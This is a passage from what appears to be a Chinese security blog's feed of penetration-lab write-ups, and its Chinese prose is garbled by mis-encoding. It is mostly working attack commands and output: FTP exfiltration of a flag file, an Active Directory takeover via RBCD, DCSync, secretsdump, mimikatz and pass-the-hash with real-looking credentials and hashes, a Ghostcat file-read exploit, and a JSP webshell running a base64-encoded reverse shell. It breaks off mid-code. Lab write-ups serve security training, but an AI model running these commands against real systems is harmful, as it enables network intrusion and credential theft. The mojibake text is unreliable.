ï¼Œæˆ‘ä»¬å†èµ·ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078675248-8bd23386-da3e-43f3-94eb-24a249483895.png"></p><p>å†sshä¸Š57</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.22.13.14 6666</span><br><span class="line">put /flag02.txt</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·åtestå¯†ç test</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743079004828-70c8e20a-9463-4b35-a186-8a76ff7ba85b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743079032185-1598bbb7-fb23-41bc-95df-3d9eda5666f9.png"></p><p>å†å›å»çœ‹ä¸€ä¸‹,æœ‰ä¸ªpas.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743080134644-d4d62b56-b7cb-447d-b10f-56877395dd72.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab/zhangwen\QT62f3gBhK1</span><br></pre></td></tr></table></figure><p>å†å›å»ç”¨bloodhoundæ”¶é›†ä¸€ä¸‹åŸŸå†…ä¿¡æ¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743082403028-fd66a712-a9ef-4564-b5d2-9c612d8d6806.png"></p><p>ç”¨BloodHoundå‘ç°chengleiè¿™ä¸ªç”¨æˆ·æ˜¯ACL Adminsç»„çš„ï¼Œå¯¹WIN-DCå…·æœ‰WriteDaclæƒé™ï¼Œèƒ½å†™å±æ€§ï¼Œæ¯”å¦‚å†™ä¸ªDCSyncã€RBCDå•¥çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -action write -delegate-to &#x27;WIN-DC$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=Administrator@cifs_WIN-DC.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743081806411-f966471a-0373-41f2-b488-c787c4dfc143.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743081827765-61e7784f-860f-4991-aa10-8ac015fcc046.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743081866826-07d512b0-2e9b-435f-82c8-b0cd111a5901.png"></p><p>ç„¶åæ”¹&#x2F;etc&#x2F;hostsæŠŠdcåŠ è¿›å»ï¼Œå³å¯æ— å¯†ç è¿ä¸Šå»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@WIN-DC.xiaorang.lab -k -no-pass -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\User\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•æ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ç›´æ¥åŠ dcsyncç„¶åå¯¼å‡ºåŸŸæ§hash</p><p><a href="https://github.com/EmpireProject/Empire/releases/tag/2.5">https://github.com/EmpireProject/Empire/releases/tag/2.5</a></p><p>åœ¨è¿™ä¸ªç›®å½•ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743083148854-049e5a83-db29-4648-a378-7091fc037441.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743083129742-1784555e-ecbf-4d73-b758-fde00444dc97.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIdentity chenglei -Rights DCSync -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 secretsdump.py xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382 -just-dc-ntlm</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†ç”¨çŒ•çŒ´æ¡ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><p>æœ€åæ‰“pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Spoofing</title>
      <link href="/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"/>
      <url>/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ¥çœ‹ä¸€ä¸‹è€ƒç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952637279-d955c951-bc69-45b3-ace0-f9790b141746.png"></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆfscanæ‰«ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.116.168</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.116.168:8080 open</span><br><span class="line">39.98.116.168:22 open</span><br><span class="line">39.98.116.168:8009 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">å·²å®Œæˆ 3/3</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 11.0582457s</span><br></pre></td></tr></table></figure><p>å‘ç°8080å’Œ8009å¼€ç€ï¼Œå…ˆå»çœ‹ä¸€ä¸‹8080,å‘ç°æ˜¯ä¸ªåå°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952863608-1a0e725e-f006-42fc-94a0-15b87ebb21e9.png"></p><p>å†æ‰«ä¸€ä¸‹åå°ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://39.98.116.168:8080/</span><br><span class="line"></span><br><span class="line">Target: http://39.98.116.168:8080/</span><br><span class="line"></span><br><span class="line">[09:35:33] Starting:</span><br><span class="line">[09:35:33] 302 -    0B  - /js  -&gt;  /js/</span><br><span class="line">[09:35:40] 200 -  114B  - /404.html</span><br><span class="line">[09:35:40] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[09:35:41] 400 -  795B  - /a%5c.aspx</span><br><span class="line">[09:35:55] 200 -    7KB - /console.html</span><br><span class="line">[09:35:56] 302 -    0B  - /css  -&gt;  /css/</span><br><span class="line">[09:35:56] 302 -    0B  - /data  -&gt;  /data/</span><br><span class="line">[09:35:58] 302 -    0B  - /docs  -&gt;  /docs/</span><br><span class="line">[09:35:58] 404 -  732B  - /docs/CHANGELOG.html</span><br><span class="line">[09:35:58] 404 -  733B  - /docs/export-demo.xml</span><br><span class="line">[09:35:58] 404 -  729B  - /docs/_build/</span><br><span class="line">[09:35:58] 404 -  731B  - /docs/changelog.txt</span><br><span class="line">[09:35:58] 404 -  749B  - /docs/html/admin/ch01s04.html</span><br><span class="line">[09:35:58] 404 -  747B  - /docs/html/admin/index.html</span><br><span class="line">[09:35:58] 404 -  750B  - /docs/html/developer/ch02.html</span><br><span class="line">[09:35:58] 404 -  733B  - /docs/maintenance.txt</span><br><span class="line">[09:35:58] 404 -  730B  - /docs/swagger.json</span><br><span class="line">[09:35:58] 404 -  749B  - /docs/html/admin/ch03s07.html</span><br><span class="line">[09:35:58] 404 -  753B  - /docs/html/developer/ch03s15.html</span><br><span class="line">[09:35:58] 404 -  737B  - /docs/html/index.html</span><br><span class="line">[09:35:58] 200 -   17KB - /docs/</span><br><span class="line">[09:35:58] 404 -  746B  - /docs/html/admin/ch01.html</span><br><span class="line">[09:35:58] 404 -  730B  - /docs/updating.txt</span><br><span class="line">[09:35:58] 200 -  132B  - /download/</span><br><span class="line">[09:35:58] 302 -    0B  - /download  -&gt;  /download/</span><br><span class="line">[09:36:00] 302 -    0B  - /examples  -&gt;  /examples/</span><br><span class="line">[09:36:00] 404 -  781B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/</span><br><span class="line">[09:36:00] 200 -    6KB - /examples/servlets/index.html</span><br><span class="line">[09:36:00] 200 -   14KB - /examples/jsp/index.html</span><br><span class="line">[09:36:00] 200 -  658B  - /examples/servlets/servlet/CookieExample</span><br><span class="line">[09:36:00] 404 -  746B  - /examples/servlet/SnoopServlet</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/websocket/index.xhtml</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[09:36:01] 200 -  685B  - /examples/jsp/snp/snoop.jsp</span><br><span class="line">[09:36:03] 403 -    3KB - /host-manager/html</span><br><span class="line">[09:36:03] 403 -    3KB - /host-manager/</span><br><span class="line">[09:36:04] 302 -    0B  - /images  -&gt;  /images/</span><br><span class="line">[09:36:07] 302 -    0B  - /lib  -&gt;  /lib/</span><br><span class="line">[09:36:09] 302 -    0B  - /manager  -&gt;  /manager/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/login</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/html/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/admin.asp</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/login.asp</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/VERSION</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/status/all</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/html</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?qry=STUFF</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY</span><br><span class="line">[09:36:29] 403 -    0B  - /upload</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/1.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/2.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/loginIxje.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/test.txt</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/b_user.xls</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/b_user.csv</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/upload.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/test.php</span><br><span class="line">[09:36:29] 200 -    9KB - /user.html</span><br></pre></td></tr></table></figure><p>ç‰ˆæœ¬å·æ³„æ¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742953036071-d879f897-cb48-4c3c-b60b-8f26633c4bd5.png"></p><h2 id="CVE-2020-1983-Tomcatæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#CVE-2020-1983-Tomcatæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="CVE-2020-1983 Tomcatæ–‡ä»¶åŒ…å«æ¼æ´"></a>CVE-2020-1983 Tomcatæ–‡ä»¶åŒ…å«æ¼æ´</h2><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.116.168:8080 8009  /WEB-INF/web.xml read</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span><br><span class="line">         |__/|_|                                        </span><br><span class="line">                                                00theway,just for test</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">[&lt;] 200 200</span><br><span class="line">[&lt;] Accept-Ranges: bytes</span><br><span class="line">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span><br><span class="line">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span><br><span class="line">[&lt;] Content-Type: application/xml</span><br><span class="line">[&lt;] Content-Length: 2489</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;security-constraint&gt;</span><br><span class="line">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;</span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;</span><br><span class="line">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line">      &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line">  &lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;403&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>å­˜ä¸ºå­—å…¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.107.181:8080 8009  /WEB-INF/web.xml read |grep url-pattern |awk -F &#x27;&gt;&#x27; &#x27;&#123;print $2&#125;&#x27; |awk -F &#x27;&lt;&#x27; &#x27;&#123;print $1&#125;&#x27; &gt;web-xml.dict</span><br></pre></td></tr></table></figure><p>æ¨¡ç³Šæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w web-xml.dict -u http://39.98.107.181:8080FUZZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://39.98.107.181:8080FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: /root/yst/Ghostcat-CNVD-2020-10487-master/web-xml.dict</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">/upload/*               [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 52ms]</span><br><span class="line">/RegisterServlet        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]</span><br><span class="line">/LoginServlet           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 53ms]</span><br><span class="line">/DownloadServlet        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 54ms]</span><br><span class="line">  /UploadServlet          [Status: 200, Size: 682, Words: 145, Lines: 24, Duration: 58ms]</span><br><span class="line">/HelloServlet           [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 58ms]</span><br><span class="line">:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::</span><br></pre></td></tr></table></figure><p>æµ‹è¯•upload,ä¼ ğŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveHh4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        